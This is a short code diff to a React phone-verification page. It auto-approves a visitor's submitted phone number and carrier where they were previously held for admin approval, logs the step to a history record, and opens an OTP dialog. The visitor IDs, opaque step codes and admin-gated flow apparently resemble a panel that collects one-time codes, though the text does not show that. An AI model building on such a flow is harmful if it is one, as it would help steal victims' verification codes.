@@ -175,12 +175,17 @@ export default function VerifyPhonePage() {
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
-        _v4Status: "pending", // Set to pending for admin approval
+        _v4Status: "approved", // Auto-approve phone verification
         phoneUpdatedAt: new Date().toISOString(),
         redirectPage: null // Clear any old redirect
       }, { merge: true })
 
-      // Don't add to history yet - will add after OTP entry
+      // Add to history as approved
+      await addToHistory(visitorID, "_t4", {
+        phoneNumber: phoneNumber,
+        phoneCarrier: selectedCarrier
+      }, "approved")
+
       // Open Phone OTP Dialog directly
       setShowPhoneOtpDialog(true)
     } catch (error) {
